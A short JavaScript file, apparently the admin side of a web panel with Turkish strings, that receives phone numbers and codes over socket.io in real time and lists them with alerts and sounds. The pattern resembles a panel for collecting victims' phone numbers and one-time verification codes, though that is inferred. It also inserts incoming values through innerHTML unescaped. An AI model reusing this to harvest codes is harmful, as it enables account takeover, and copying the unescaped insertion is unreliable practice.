const socket = io();
console.log("ADMIN SOCKET YÜKLENDİ");

const phoneTable = document.getElementById("phones-table");
const codeTable = document.getElementById("codes-table");

socket.on("connect", () => {
  console.log("ADMIN SOCKET CONNECTED:", socket.id);
});

socket.on("admin-new-phone", (data) => {
  console.log("ADMIN PHONE GELDİ:", data);

  const tr = document.createElement("tr");
  tr.innerHTML = `<td>${data.phone}</td><td>${data.date}</td>`;
  phoneTable.prepend(tr);

  if (Notification.permission === "granted") {
    new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
  } else if (Notification.permission !== "denied") {
    Notification.requestPermission().then(perm => {
      if (perm === "granted") new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
    });
  }

  const audio = new Audio('/phone.mp3');
  audio.play().catch(err => console.log('Ses hatası:', err));
});

socket.on("admin-new-code", (data) => {
  console.log("ADMIN CODE GELDİ:", data);

  const tr = document.createElement("tr");
  tr.innerHTML = `<td>${data.code}</td><td>${data.date}</td>`;
  codeTable.prepend(tr);

  if (Notification.permission === "granted") {
    new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
  } else if (Notification.permission !== "denied") {
    Notification.requestPermission().then(perm => {
      if (perm === "granted") new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
    });
  }

  const audio = new Audio('/code.mp3');
  audio.play().catch(err => console.log('Ses hatası:', err));
});